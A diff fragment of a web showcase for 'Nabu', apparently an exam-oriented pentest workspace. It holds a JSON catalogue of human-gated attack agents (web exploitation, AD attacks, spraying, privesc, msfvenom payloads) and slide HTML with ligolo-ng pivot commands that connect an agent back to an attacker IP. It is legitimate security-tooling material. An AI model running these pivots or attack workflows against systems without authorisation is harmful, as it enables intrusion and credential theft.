engine.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-patterns"],"reads_stores":["s-findings","s-creds","s-notes"],"hands_off_to":["orchestrator","attack-planner","ref-analyst"],"does":"Consumes all findings, correlates across services, dedups and ranks the attack surface. Runs the provenance-cited pattern/suggestion engine to emit sensible recon next steps. It is the decision-aid core: it proposes and prioritizes but never executes."},{"id":"ref-analyst","name":"Reference & Vuln-Lookup Agent","layer":"analysis","role":"Per product/version, runs searchsploit and pulls the mapped HackTricks page; lookup and linkout only.","autonomy":"autonomous","instantiation":"pool","calls_tools":["t-searchsploit","t-hacktricks"],"reads_stores":["s-findings","s-profile"],"hands_off_to":["analysis-lead","attack-planner"],"does":"For each fingerprinted product/version it runs searchsploit and fetches the single canonical mapped HackTricks page (vendored snapshot or owner-approved live cache), summarizing applicable technique classes into finding context. Strictly lookup and linkout: it never downloads, transforms or executes a PoC, and never transmits target data to HackTricks. Pooled so many fingerprints resolve in parallel."},{"id":"cred-manager","name":"Credential Vault Agent","layer":"analysis","role":"Owns creds.json: ingests looted secrets, dedups, tracks reuse, and proposes credential-reuse candidates.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-creds-cli"],"reads_stores":["s-creds","s-findings"],"hands_off_to":["attack-planner","spray-agent","svc-attack","ad-attack"],"does":"Owns the durable credential vault: ingests parsed/looted secrets, dedups, tags source and tracks tested_against across services. Proposes credential-reuse candidates (auth checks and spray targets) as new services are found. Vault entries are durable and shown in full per owner policy, never redacted."},{"id":"loot-parser","name":"Loot Parser Agent","layer":"analysis","role":"Parses attack/post-ex output (secretsdump, Kerberos tickets, configs) into structured loot; non-executing.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-creds-cli"],"reads_stores":["s-creds","s-findings","s-service-out"],"hands_off_to":["cred-manager","crack-agent"],"does":"Parses operator-produced attack and post-exploitation output (secretsdump, Kerberos tickets, config dumps) into structured loot and writes recovered credentials to the vault. Forwards captured hashes to the cracking agent. It only parses output the human already obtained; it never runs anything against a target."},{"id":"crack-agent","name":"Hash Cracking Agent","layer":"analysis","role":"Selects the hashcat/john mode and runs offline local cracking against wordlists; target-less, so autonomous.","autonomy":"autonomous","instantiation":"pool","calls_tools":["t-hashcat","t-wordlists"],"reads_stores":["s-creds"],"hands_off_to":["cred-manager"],"does":"Takes hashes from loot, selects the correct hashcat/john mode and runs OFFLINE local cracking against wordlists, writing recovered plaintext back to the vault. Because cracking is offline and target-less it is genuinely autonomous, not an attack against the target. Pooled to parallelize multiple hash sets."},{"id":"web-attack","name":"Web Exploitation Agent","layer":"attack","role":"Per web app/port; executes one human-confirmed web action and parses output into loot.","autonomy":"human-gated","instantiation":"per-service","calls_tools":["t-exploit-web","t-msfvenom","t-searchsploit"],"reads_stores":["s-findings","s-creds","s-service-out"],"hands_off_to":["loot-parser","cred-manager","pivot-agent"],"does":"Per web app/port, it executes a single human-confirmed action from the web pack (SQLi/LFI/RFI/XSS/SSTI/cmd-injection/XXE/upload/deserialization/SSRF/IDOR/auth-bypass/LFI->RCE), streams the output and parses it into loot. One confirmed command per Run, no chaining. The confirmation naming the target is the guardrail."},{"id":"ad-attack","name":"Active Directory Attack Agent","layer":"attack","role":"Per domain; executes human-confirmed AD actions (Kerberos, delegation, ADCS, coercion, relay, DCSync, lateral).","autonomy":"human-gated","instantiation":"per-domain","calls_tools":["t-exploit-ad","t-msfvenom","t-exploit-shells"],"reads_stores":["s-creds","s-findings","s-graph"],"hands_off_to":["loot-parser","cred-manager","pivot-agent","ad-mapper"],"does":"Per domain, it executes human-confirmed AD actions one at a time: Kerberoast/AS-REP, delegation and ACL abuse, ADCS ESCx, coercion, NTLM relay, DCSync/secretsdump, lateral movement and AD CVEs (noPac/Zerologon). Feeds dumped secrets to the vault and updates the AD graph. Every Run pops a target-named confirmation; no autopwn chain."},{"id":"svc-attack","name":"Service Exploitation Agent","layer":"attack","role":"Per service; runs the confirmed default-cred/config/loot/technique action from the non-web/non-AD service packs.","autonomy":"human-gated","instantiation":"per-service","calls_tools":["t-exploit-services","t-msfvenom","t-gtfobins","t-searchsploit"],"reads_stores":["s-findings","s-creds","s-service-out"],"hands_off_to":["loot-parser","cred-manager","pivot-agent"],"does":"Generic executor for the non-web/non-AD service packs (mssql/mysql/redis/ftp/ssh/snmp/rdp/nfs plus the ~176 app/CMS/appliance packs). It runs the operator-confirmed default-cred, config-read, loot or technique action for its service, one command per Run. Warns loudly if the operator selects an action for a service the scan did not find, but the human confirm stays the gate."},{"id":"spray-agent","name":"Credential Spray Agent","layer":"attack","role":"Active only in opt-in Spray mode; runs operator-selected, target-scoped spraying against the single active target.","autonomy":"human-gated","instantiation":"singleton","calls_tools":["t-spray","t-wordlists"],"reads_stores":["s-creds","s-profile","s-findings"],"hands_off_to":["cred-manager","loot-parser"],"does":"Dormant unless the opt-in Spray mode (spray_enabled) is on; off by default the policy-guard blocks every brute/spray tool. When enabled it runs operator-selected, target-scoped spraying (netexec/hydra/medusa/wpscan --passwords) against the single active profile target using vault creds. It never sprays the exam VPN, control panel or any out-of-scope host, and confirms before running."},{"id":"privesc-linux","name":"Linux Privilege-Escalation Agent","layer":"attack","role":"Works the 22-class Linux privesc pack; mostly victim-side copy-only advice plus human-confirmed attacker Runs.","autonomy":"human-gated","instantiation":"singleton","calls_tools":["t-exploit-linux","t-gtfobins","t-exploit-shells","t-hashcat"],"reads_stores":["s-creds","s-findings","s-notes"],"hands_off_to":["loot-parser","cred-manager","pivot-agent"],"does":"After a foothold it works the Linux privesc pack (22 classes: SUID/sudo/cron/capabilities/kernel/GTFOBins/loot-cracking). Most actions are victim-side, copy-only command lists the operator pastes into their own shell; any attacker-side Run is human-confirmed. Feeds recovered secrets and crackable hashes onward."},{"id":"privesc-windows","name":"Windows Privilege-Escalation Agent","layer":"attack","role":"Works the 12-class Windows privesc pack plus the potato family and token abuse; victim-side plus confirmed Runs.","autonomy":"human-gated","instantiation":"singleton","calls_tools":["t-exploit-windows","t-gtfobins","t-msfvenom","t-hashcat"],"reads_stores":["s-creds","s-findings","s-notes"],"hands_off_to":["loot-parser","cred-manager","pivot-agent"],"does":"After a foothold it works the Windows privesc pack (12 classes) plus the full potato family (JuicyPotato/RoguePotato/GodPotato/PrintSpoofer) and token abuse. Victim-side steps are copy-only guidance; attacker-side Runs are human-confirmed. Forwards dumped hashes to loot and cracking."},{"id":"pivot-agent","name":"Pivot & Tunneling Agent","layer":"attack","role":"Per internal network; sets up confirmed ligolo/ssh tunnels, updates the multi-network graph, re-invokes scoped recon.","autonomy":"human-gated","instantiation":"pool","calls_tools":["t-pivot","t-graph"],"reads_stores":["s-graph","s-findings","s-notes","s-profile"],"hands_off_to":["recon-lead","orchestrator"],"does":"Pooled one worker per newly discovered internal subnet after a foothold: it sets up human-confirmed ligolo/ssh (-L/-R/-D) tunnels, updates the multi-network pivot graph and re-invokes recon against the pivoted network \u2014 but only after a scope check. Establishing a tunnel is itself a confirmed action, so it is human-gated."},{"id":"report-agent","name":"Reporting & Graph Agent","layer":"reporting","role":"Assembles report.md, maintains the Cytoscape graph, and produces the Obsidian vault export and audit appendix.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-reporter","t-graph","t-project-ops"],"reads_stores":["s-profile","s-findings","s-creds","s-graph","s-notes","s-report","s-audit"],"hands_off_to":["orchestrator","intake"],"does":"Continuously assembles report.md (Obsidian frontmatter, command log, provenance-cited suggestions) and maintains the BloodHound-style Cytoscape graph. Produces the Obsidian vault export and the audit-trail appendix. Read-mostly and offline; it documents but never executes a target action."}],"tools":[{"id":"t-nmap","name":"Nmap Staged Scanner","group":"recon","wraps":"nabu-cli scan (modules/nmap.py) \u2014 staged TCP top-1000/full/versioned + UDP top-100/full, NSE","count":"5 scan stages; 83 presets + NSE picker","used_by":["recon-lead"]},{"id":"t-recon-enum","name":"Service Enum Modules","group":"recon","wraps":"nabu-cli enum <svc> (modules/*) \u2014 tiered read-only per-service recon","count":"52 modules","used_by":["service-enum","web-recon","ad-mapper"]},{"id":"t-peek","name":"Data Peek","group":"recon","wraps":"modules/peek.py \u2014 bounded SMB/FTP file preview via binary+sensitive denylist","count":"1 previewer","used_by":["service-enum"]},{"id":"t-wordlists","name":"Wordlist Manager","group":"knowledge","wraps":"wordlists.py + WordlistPicker \u2014 indexes seclists/custom; filters Passwords/ unless Spray mode","count":"indexed seclists + custom paths","used_by":["web-recon","spray-agent","crack-agent"]},{"id":"t-exploit-web","name":"Web Exploit Pack","group":"exploit","wraps":"nabu-cli exploit web (exploit/web.py)","count":"20 technique classes / ~86 actions","used_by":["attack-planner","web-attack"]},{"id":"t-exploit-ad","name":"Active Directory Attack Pack","group":"exploit","wraps":"nabu-cli exploit ad (exploit/ad.py)","count":"15 categories / 133 actions","used_by":["attack-planner","ad-attack"]},{"id":"t-exploit-linux","name":"Linux Privesc Pack","group":"exploit","wraps":"nabu-cli exploit linux (exploit/linux.py, victim-side copy-only + loot cracking)","count":"22 privesc classes","used_by":["attack-planner","privesc-linux"]},{"id":"t-exploit-windows","name":"Windows Privesc Pack","group":"exploit","wraps":"nabu-cli exploit windows (exploit/windows.py, potato family + token abuse)","count":"12 privesc classes","used_by":["attack-planner","privesc-windows"]},{"id":"t-exploit-shells","name":"Shells & File-Transfer Pack","group":"exploit","wraps":"nabu-cli exploit shells (exploit/shells.py)","count":"7 classes (reverse shells + file transfers)","used_by":["ad-attack","privesc-linux","privesc-windows"]},{"id":"t-exploit-services","name":"Service Exploit Packs","group":"exploit","wraps":"nabu-cli exploit <svc> (exploit/*.py, the app/CMS/DB/appliance service packs)","count":"~176 packs / balance of 3187 actions (183 svc total)","used_by":["attack-planner","svc-attack"]},{"id":"t-msfvenom","name":"msfvenom Payload Builder","group":"payload","wraps":"nabu-cli payload (exploit/msfvenom.py) \u2014 copy-only reverse-shell + listener syntax, never executes","count":"platform x payload x format matrix","used_by":["web-attack","ad-attack","svc-attack","privesc-windows"]},{"id":"t-gtfobins","name":"GTFOBins Lookup","group":"knowledge","wraps":"nabu-cli gtfobins (references/gtfobins.yaml) \u2014 copy-only privesc/bypass lookup","count":"66 binaries","used_by":["svc-attack","privesc-linux","privesc-windows"]},{"id":"t-hashcat","name":"Hashcat / John Cracking","group":"cracking","wraps":"nabu-cli hashcat (hashcat.py + hashcat_modes.yaml) \u2014 offline local cracking","count":"hashcat/john mode map","used_by":["crack-agent","privesc-linux","privesc-windows"]},{"id":"t-searchsploit","name":"Searchsploit / Exploit-DB","group":"reference","wraps":"nabu-cli searchsploit \u2014 version-aware Exploit-DB lookup, linkout only (never download/execute PoC)","count":"Exploit-DB index","used_by":["ref-analyst","attack-planner","web-attack","svc-attack"]},{"id":"t-hacktricks","name":"HackTricks Reference","group":"reference","wraps":"references/live_hacktricks.py + vendored snapshot + sections.py \u2014 offline render + owner-approved live fetch/cache","count":"21 vendored pages + live cache","used_by":["ref-analyst"]},{"id":"t-patterns","name":"Pattern / Suggestion Engine","group":"knowledge","wraps":"patterns/*.yaml + engine \u2014 finding-driven, provenance-cited next steps","count":"52 provenance rule files","used_by":["analysis-lead"]},{"id":"t-graph","name":"BloodHound-style Graph","group":"ops","wraps":"gui/widgets/graph_view.py + graph.json (vendored Cytoscape.js), multi-network pivot map","count":"1 graph engine","used_by":["ad-mapper","pivot-agent","report-agent"]},{"id":"t-reporter","name":"Reporter & Obsidian Export","group":"ops","wraps":"reporter.py + templates + export-* \u2014 report.md (Obsidian frontmatter) + vault export + audit appendix","count":"1 reporter","used_by":["report-agent"]},{"id":"t-doctor","name":"Doctor / Host Readiness","group":"ops","wraps":"nabu-cli doctor \u2014 per-tool which + reference-data + exam-day host readiness checks","count":"per-tool + host checks","used_by":["intake","orchestrator"]},{"id":"t-pivot","name":"Pivot / Tunnel (ligolo/ssh)","group":"pivot","wraps":"nabu-cli pivot (pivot.py) \u2014 ligolo + ssh -L/-R/-D tunnels across internal networks","count":"ligolo + ssh tunnel builders","used_by":["pivot-agent"]},{"id":"t-spray","name":"Credential Spray","group":"exploit","wraps":"nabu-cli spray (spray.py) \u2014 netexec/hydra/medusa/wpscan --passwords, opt-in, off by default","count":"gated by spray_enabled (default false)","used_by":["spray-agent"]},{"id":"t-creds-cli","name":"Credential Vault CLI","group":"ops","wraps":"nabu-cli creds add/list/rm \u2014 writes creds.json (chmod 600, durable, shown in full)","count":"3 subcommands","used_by":["cred-manager","loot-parser"]},{"id":"t-project-ops","name":"Project & State Ops CLI","group":"ops","wraps":"nabu-cli list/findings/health/activity/delete-project/export-*/import-project/config/docs","count":"~10 lifecycle commands","used_by":["intake","orchestrator","recon-lead","report-agent"]}],"stores":[{"id":"s-profile","name":"profile.json","holds":"Target + discovered_services, command_history, references_visited, module_settings, status (state/started/rooted). The engagement spine every agent reads."},{"id":"s-findings","name":"findings.json","holds":"Structured parser findings, accumulated and growing across runs (services, banners, disclosures, misconfigs). The shared analysis blackboard."},{"id":"s-creds","name":"creds.json","holds":"Credential vault, chmod 600. Durable and shown in FULL (owner policy: never redacted). Tracks username/domain/secret_type/source/tested_against for cross-service reuse."},{"id":"s-graph","name":"graph.json","holds":"BloodHound-style graph: user/derived edges, node positions, per-node status/notes, and the multi-network pivot map."},{"id":"s-notes","name":"notes.md","holds":"Long-form operator notes, editable in-GUI; consumed into the report and used as context by analysis/attack agents."},{"id":"s-report","name":"report.md (+ report-archive/)","holds":"Obsidian-compatible master report (frontmatter, per-service findings, suggestions, full command log); prior versions timestamp-archived."},{"id":"s-audit","name":"audit.jsonl (+ audit-archive/)","holds":"Append-only, one-JSON-per-line record of every action (runs, setting changes, cred edits with secret redacted); the exam audit trail, rotated per day."},{"id":"s-service-out","name":"Per-service output folders","holds":"Raw tool output subtrees: nmap/, http/<port>/, smb/, ftp/, ldap/\u2026 \u2014 the on-disk evidence files parsers and loot-parser read."},{"id":"s-config","name":"~/.config/oscprecon/","holds":"App/user config outside any project: prefs.json (workspace root, theme, wordlist paths, spray_enabled/exploit_enabled), favorites.json, recent.json."},{"id":"s-ht-cache","name":"~/.cache/oscprecon/hacktricks/","holds":"Rebuildable local cache of owner-approved live HackTricks fetches. Non-authoritative, never project data; clearing it never touches project state."}],"infra":[{"id":"i-portal","name":"Operator Portal / A2A Ingress","kind":"portal","does":"The human operator's console (GUI/CLI) \u2014 the single ingress to the agent mesh where the operator states goals, watches streamed status, and answers attack confirmations. The Operator Liaison Agent runs behind it."},{"id":"i-mcp-gateway","name":"nabu-cli MCP Tool Gateway","kind":"gateway","does":"Exposes every nabu-cli command as a typed MCP tool; the ONLY channel through which agents touch NABU capabilities. Normalizes arguments and enforces tool schemas so agents cannot reach the OS directly."},{"id":"i-a2a-bus","name":"A2A Message Bus / Blackboard","kind":"bus","does":"Routes agent-to-agent handoff envelopes (task/result) and hosts the shared project blackboard (findings/creds/graph updates) so the small agent set coordinates without a monolith and per-service/per-domain agents fan out and rejoin."},{"id":"i-policy-guard","name":"shell.py policy_violation() Chokepoint","kind":"policy-guard","does":"The SOLE process-exec boundary. Enforces the recon-only allow-list by default; only an explicitly flagged exploit=True (post human-confirm) or spray=True (opt-in mode) command is permitted, with an empty-command check. No agent and no MCP tool bypasses it."},{"id":"i-human-gate","name":"Attack Confirmation Gate","kind":"human-gate","does":"Every attack/spray/pivot Run pops a target-named confirmation to the operator before execution \u2014 one command per Run, no chaining, no scan->exploit auto-pipeline. This confirmation IS the safety model for all human-gated attack-layer agents."},{"id":"i-scope-sentinel","name":"Scope Sentinel","kind":"policy-guard","does":"Validates that every target IP/subnet an agent (recon, attack, spray, pivot) acts on is within the authorized engagement scope \u2014 never the exam VPN, control panel, or an out-of-scope host. A hard, non-negotiable pre-dispatch check."},{"id":"i-runtime","name":"Agent Runtime & Audit Writer","kind":"runtime","does":"Hosts the local/offline LLM-driven agents (the new layer NABU lacked), instantiates per-service/per-domain/pool agents on demand, writes best-effort to audit.jsonl and the diagnostics log, and enforces the per-project .lock concurrency guard."}],"counts_note":"Real, verified counts from the repo: 52 recon module dirs under src/oscprecon/modules/ (nabu-cli enum <x>), nmap.py staged scan as the entry. Exploit catalog = 181 service .py files (~183 services) with 3187 ExploitAction instances, split here into 6 tool packs: web (20 classes / ~86 actions), ad (15 categories / 133 actions), linux (22 classes), windows (12 classes), shells (7 classes), and ~176 remaining app/CMS/DB/appliance service packs. Standalone engines: msfvenom (copy-only), gtfobins (66 binaries), hashcat, searchsploit, live_hacktricks (21 vendored pages + live cache), patterns (52 provenance rule files), Cytoscape graph, reporter+Obsidian, wordlists, doctor, pivot (ligolo/ssh), spray (off by default). 20 nabu-cli commands wrapped. AGENT COUNT: 20 agent TYPES (not one-per-module) \u2014 7 dynamically instantiated (service-enum, web-recon per web port, svc-attack, web-attack per-service; ad-mapper, ad-attack per-domain; pivot-agent per internal network/pool). 12 autonomous, 8 human-gated; ALL 7 attack-layer executor agents are human-gated, and attack-planner is deliberately placed in orchestration (non-executing) so the attack layer contains only human-gated agents. 18 tool groups, 10 stores, 7 infra pieces.","unclassified":[]}};
+const URLS={tree:'https://claude.ai/code/artifact/c42a305b-4134-4417-83aa-3438416eb883',map:'https://claude.ai/code/artifact/f142d0d5-53f0-4272-b90d-3e170b544ef6',timeline:'https://claude.ai/code/artifact/fbeb6769-bbcf-45d6-a94c-ae323d4b78b9'};
+const A=INV.classify.agents,T=INV.classify.tools,S=INV.classify.stores,I=INV.classify.infra;
 
-const SLIDES = [
-  // 1 — cover
-  {cls:"center", html:`
-    <div class="eyebrow">A guided showcase · updated July 2026</div>
-    <h1>Nabu, end to end:<br><span class="gold">recon → exploitation.</span></h1>
-    <p class="lede">One local workspace that discovers a box, enumerates every service, maps the attack
-      surface, pivots across internal networks — and now <b>attacks</b>, one human-confirmed command at a
-      time. Exam-legal by default, offline, no AI.</p>
-    <p class="lede" style="font-size:14px">21 slides · click the <span class="gold">‹ ›</span> arrows or use
-      <span class="kbd">→</span>/<span class="kbd">←</span> · <span class="kbd">F</span> fullscreen · <span class="kbd">▶</span> autoplay</p>`},
+document.getElementById('stats').innerHTML=[
+ ['20','agents'],['23','tools'],['183','services'],['3,187','actions'],['52','recon modules'],['50','boxes tested'],
+].map(([n,l])=>`<div class="stat"><b>${n}</b><small>${l}</small></div>`).join('');
 
-  // 2 — workspace dashboard
-  {cls:"", html:`
-    <div class="eyebrow">Start · the workspace</div>
-    <h2>Every box is a self-contained project.</h2>
-    <div class="body even">
-      ${S("dashboard-empty.png","The workspace dashboard")}<div class="cap">Workspace · a searchable, filterable table of every engagement</div></div>
-      <ul class="points">
-        <li><span class="h">One folder per box.</span> <small>Services, findings, creds, notes, graph, report — reopen it and the whole state comes back.</small></li>
-        <li><span class="h">Find it fast.</span> <small>Search and filter by name, IP, platform or status; open-by-IP when you forget the name.</small></li>
-        <li><span class="h">Safe to run many.</span> <small>Profile locks + stale-lock recovery; a second window opens read-only.</small></li>
-        <li><span class="h">Portable.</span> <small>Import / export a project as a <span class="kbd">.tar.gz</span> to move it between machines.</small></li>
-      </ul>
-    </div>`},
+document.getElementById('views').innerHTML=[
+ ['🌳','var(--agent)',URLS.tree,'Recon-to-Root Decision Tree','One scan at the top, every path to root branching below. Click any step to light up its full path from the nmap scan down.',['249 nodes','all 52 modules','every technique class','collapsible']],
+ ['🗺️','var(--tool)',URLS.map,'A2A Agent Map','The architecture typed correctly — what is an agent vs a tool vs state vs a guardrail. Click an agent to trace the tools it calls.',['20 agents','23 tools','10 stores','7 guardrails']],
+ ['🧭','var(--gold)',URLS.timeline,'Tool → Agent Platform','The user flow (log in, drop a host or /24s, agents work, you approve attacks) plus the crawl-walk-run build roadmap.',['18-step flow','6 build phases','11 blockers']],
+].map(([ic,vc,url,h,p,inside])=>`<a class="view" style="--vc:${vc}" href="${url}" target="_blank"><div class="ic">${ic}</div><h3>${h}</h3><p>${p}</p><div class="inside">${inside.map(x=>`<span>${x}</span>`).join('')}</div><div class="go">Open view →</div></a>`).join('');
 
-  // 3 — three-pane workspace
-  {cls:"", html:`
-    <div class="eyebrow">The workspace</div>
-    <h2>Everything for one box, in one window.</h2>
-    <div class="showcase hero">
-      ${S("shell-dark.png","Nabu's three-pane recon workspace")}<div class="cap">Recon tab · service tree (left) · command builder (middle) · live HackTricks &amp; Exploit-DB (right)</div></div>
-      <div class="prow">
-        <div class="p"><span class="h">Left: your services.</span><small>Every open port, TCP + UDP — click to drive its module.</small></div>
-        <div class="p"><span class="h">Middle: the command builder.</span><small>Dropdowns &amp; sliders build the exact command — you press Run.</small></div>
-        <div class="p"><span class="h">Right: references, offline.</span><small>The matching HackTricks page + a version-aware Exploit-DB lookup.</small></div>
-        <div class="p"><span class="h">Rail: the whole workflow.</span><small>Workspace · Recon · Graph · Findings · Credentials · Notes · Report.</small></div>
-      </div>
-    </div>`},
+const gated=A.filter(a=>a.autonomy==='human-gated').length;
+document.getElementById('counts').innerHTML=[
+ ['--agent','20','agents',`${20-gated} autonomous · ${gated} human-gated`],
+ ['--tool','23','tools','52 modules · 3,187 actions'],
+ ['--store','10','state stores','the shared blackboard'],
+ ['--infra','7','guardrails','portal · bus · chokepoint · gate'],
+].map(([c,n,l,s])=>`<div class="count" style="--c:${c}"><b>${n}</b><small>${l}</small><div class="sub">${s}</div></div>`).join('');
+document.getElementById('lgrow').innerHTML=[['--agent','Agent — autonomous'],['--gated','Agent — human-gated ⚿']].map(([c,t])=>`<span class="lg"><span class="d" style="--c:${c}"></span>${t}</span>`).join('');
 
-  // 4 — discover
-  {cls:"", html:`
-    <div class="eyebrow">Discover</div>
-    <h2>Staged nmap → every port, versioned.</h2>
-    <div class="body even">
-      ${S("services-breadth.png","The discovered-services tree")}<div class="cap">Service tree · TCP + UDP, product &amp; version, non-standard ports included</div></div>
-      <ul class="points">
-        <li><span class="h">One split-button, your call.</span> <small>Quick / Default / Full / Exam — or a custom scan with full nmap-flag control.</small></li>
-        <li><span class="h">TCP top-1000 → full → UDP → versioned.</span> <small>A <span class="kbd">-sCV</span> pass on exactly the ports that were found.</small></li>
-        <li><span class="h">Non-standard ports match too.</span> <small>http on 8080 or 65000 still routes to the web module.</small></li>
-        <li><span class="h">Discovery only.</span> <small>Nothing invasive runs here — this is just the map.</small></li>
-      </ul>
-    </div>`},
+const LAYERS=[['portal','Portal','the operator surface','--infra'],['orchestration','Orchestration','plans + delegates, never executes','--tool'],['recon','Recon','autonomous discovery','--agent'],['analysis','Analysis','the read-only decision brain','--store'],['attack','Attack','human-gated executors','--gated'],['reporting','Reporting','work product','#2f9e57']];
+document.getElementById('layers').innerHTML=LAYERS.map(([k,title,desc,lc])=>{
+  const items=A.filter(a=>a.layer===k); if(!items.length) return '';
+  return `<div class="layer"><div class="layer-h" style="--lc:${lc}"><span class="tag">${title}</span><span class="desc">${desc} · ${items.length}</span></div>
+    <div class="layer-b">${items.map(a=>{const g=a.autonomy==='human-gated';
+      return `<div class="ag${g?' gated':''}"><div class="nm"><span class="mk">${g?'⚿':'●'}</span>${a.name}</div><div class="rl">${esc(a.role||a.does||'')}</div><div class="inst">${a.autonomy} · ${a.instantiation}</div></div>`;}).join('')}</div></div>`;
+}).join('');
 
-  // 5 — HTTP per-service builder
-  {cls:"", html:`
-    <div class="eyebrow">Enumerate · per service</div>
-    <h2>Each service, its own module — granular.</h2>
-    <div class="body even">
-      ${S("http-panel.png","The HTTP module command builder")}<div class="cap">HTTP module · feroxbuster with a live command preview (port-80 content discovery)</div></div>
-      <ul class="points">
-        <li><span class="h">Build it with dropdowns.</span> <small>Wordlist, extensions, threads, depth, status codes — the exact command, previewed.</small></li>
-        <li><span class="h">Reproduce any tool.</span> <small>Swap feroxbuster → gobuster / ffuf / dirsearch; the flags translate.</small></li>
-        <li><span class="h">Non-standard HTTP ports.</span> <small>Every http-flagged port gets its own node and output subtree.</small></li>
-        <li><span class="h">Copy or Run.</span> <small>Dry-run to preview, Run to execute, Add-to-report to keep it.</small></li>
-      </ul>
-    </div>`},
-
-  // 6 — SMB tiered recon (the safety model)
-  {cls:"", html:`
-    <div class="eyebrow">Enumerate · the safety model</div>
-    <h2>Three tiers, clearly separated.</h2>
-    <div class="body">
-      ${S("smb-tool-panel.png","The SMB tiered-recon panel")}<div class="cap">SMB · one click runs the full Tier-1 recon; Tier-2 waits for you; Tier-3 stays off</div></div>
-      <div>
-        <div class="tier"><span class="b a">Auto</span><div class="d"><b>Read-only enumeration.</b> <small>Null session, guest, shares, users, RID cycling — runs on one click, streams to files.</small></div></div>
-        <div class="tier"><span class="b s">Shown</span><div class="d"><b>Single default-cred checks.</b> <small><span class="kbd">administrator:''</span>, <span class="kbd">sa:sa</span> — pre-filled in Manual Follow-ups; <b>you</b> click Run.</small></div></div>
-        <div class="tier"><span class="b o">Opt-in</span><div class="d"><b>List-driven spraying.</b> <small>Off by default; enabled only in Spray mode, against your own target.</small></div></div>
-        <p class="lede" style="font-size:14px;margin:6px 0 0">Anonymous / null-session wins auto-record to the credential vault.</p>
-      </div>
-    </div>`},
-
-  // 7 — references offline
-  {cls:"", html:`
-    <div class="eyebrow">Reference · offline-first</div>
-    <h2>HackTricks &amp; Exploit-DB, right beside the service.</h2>
-    <div class="body even">
-      ${S("reference-offline.png","The offline reference pane")}<div class="cap">Reference pane · the mapped HackTricks page, bundled offline · version-aware searchsploit</div></div>
-      <ul class="points">
-        <li><span class="h">Works with no internet.</span> <small>A build-time HackTricks snapshot is bundled; an optional live copy caches for later.</small></li>
-        <li><span class="h">Finding-aware.</span> <small>Jumps to the section that matches what was actually found on the box.</small></li>
-        <li><span class="h">Version-aware Exploit-DB.</span> <small>searchsploit by product + <span class="kbd">major.minor</span>, matched hits ranked first, capped with an "N of M" note.</small></li>
-        <li><span class="h">Lookup only.</span> <small>Exploit-DB is never downloaded, transformed, or run — a pointer to read.</small></li>
-      </ul>
-    </div>`},
-
-  // 8 — findings
-  {cls:"", html:`
-    <div class="eyebrow">Analyze · findings</div>
-    <h2>Structured findings — never over-claimed.</h2>
-    <div class="body even">
-      ${S("findings.png","The findings view")}<div class="cap">Findings · parsed facts with a conservative severity — an open port is never a "vuln"</div></div>
-      <ul class="points">
-        <li><span class="h">Facts, not raw text.</span> <small>Users, shares, versions, misconfigs — parsed into structured findings.</small></li>
-        <li><span class="h">Conservative by design.</span> <small>Only real weak postures (null session, SMB signing off) are flagged notable.</small></li>
-        <li><span class="h">Visible failures.</span> <small>A blocked/missing tool says <span class="kbd">⚠ step did not run</span> — never a silent gap.</small></li>
-        <li><span class="h">Sourced next steps.</span> <small>A pattern library suggests recon moves, each cited from a real box — pre-fill only.</small></li>
-      </ul>
-    </div>`},
-
-  // 9 — credential vault + spray
-  {cls:"", html:`
-    <div class="eyebrow">Credentials</div>
-    <h2>One vault feeds everything.</h2>
-    <div class="body even">
-      ${S("credential-vault.png","The credential vault dialog")}<div class="cap">Credential vault · <span class="kbd">creds.json</span> at 0600 — every module and attack draws from it</div></div>
-      <ul class="points">
-        <li><span class="h">Durable &amp; local.</span> <small>Stored at mode 0600; anonymous wins auto-record; secrets redacted in recon reports.</small></li>
-        <li><span class="h">Consumed everywhere.</span> <small>LDAP, WinRM, MSSQL and the Exploitation tab pre-fill from it — no re-typing.</small></li>
-        <li><span class="h">OSCP-legal spraying, opt-in.</span> <small>hydra / netexec across SMB·SSH·FTP·WinRM — off by default, target-scoped, you confirm.</small></li>
-        <li><span class="h">Loot writes back.</span> <small>Dumped hashes/creds from the Exploitation tab land here for the next move.</small></li>
-      </ul>
-    </div>`},
-
-  // 10 — attack surface graph
-  {cls:"", html:`
-    <div class="eyebrow">Present · the graph</div>
-    <h2>The whole box as one map.</h2>
-    <div class="showcase">
-      ${S("graph.png","BloodHound-style attack-surface graph")}<div class="cap">Attack-surface graph · target → services → findings → credentials (secrets redacted)</div></div>
-      <div class="prow">
-        <div class="p"><span class="h">BloodHound-style.</span><small>Every relationship is a visible line; icon nodes with status &amp; note glyphs.</small></div>
-        <div class="p"><span class="h">Notable stands out.</span><small>A red ring marks weak postures (here, SMB signing disabled).</small></div>
-        <div class="p"><span class="h">Loot connected.</span><small>Credentials link back to where they were found — secrets never shown.</small></div>
-      </div>
-    </div>`},
-
-  // 11 — LIGOLO pivot steps
-  {cls:"", html:`
-    <div class="eyebrow">Pivot · ligolo-ng</div>
-    <h2>Reach an internal network — Nabu writes the pivot.</h2>
-    <p class="lede" style="font-size:15.5px;max-width:96ch;margin:0 0 6px">
-      Fill four values and Nabu generates the exact ligolo-ng commands — each with a <b>Copy</b> button and
-      a badge for <b>where it runs</b>. It never runs the tunnel itself (that needs root); you copy, then Nabu scans the routed network.</p>
-    <div class="lg-grid">
-      <div class="lg-inputs">
-        <div class="lg-inhead">Scan → <b>Pivot with Ligolo-ng…</b></div>
-        <div class="lg-field"><span>Attacker · tun0</span><code>10.10.14.91</code></div>
-        <div class="lg-field"><span>Proxy port</span><code>11601</code></div>
-        <div class="lg-field"><span>Interface</span><code>ligolo</code></div>
-        <div class="lg-field"><span>Internal routes</span><code>172.16.1.0/24<br>172.16.2.0/24</code></div>
-        <div class="lg-innote">The commands update live as you fill these in — copy each and run it where its badge says.</div>
-      </div>
-      <div>
-        <ol class="lg-time">
-          <li><span class="lg-num">1</span><div class="lg-body">
-            <div class="lg-bh"><b>Start the proxy</b><span class="lg-loc kali">Kali</span><span class="lg-copy">Copy</span></div>
-            <code>./proxy -selfcert -laddr 0.0.0.0:11601</code></div></li>
-          <li><span class="lg-num">2</span><div class="lg-body">
-            <div class="lg-bh"><b>Run the agent</b><span class="lg-loc host">pivot host</span><span class="lg-copy">Copy</span></div>
-            <code>./agent -connect <span class="g">10.10.14.91:11601</span> -ignore-cert</code></div></li>
-          <li><span class="lg-num">3</span><div class="lg-body">
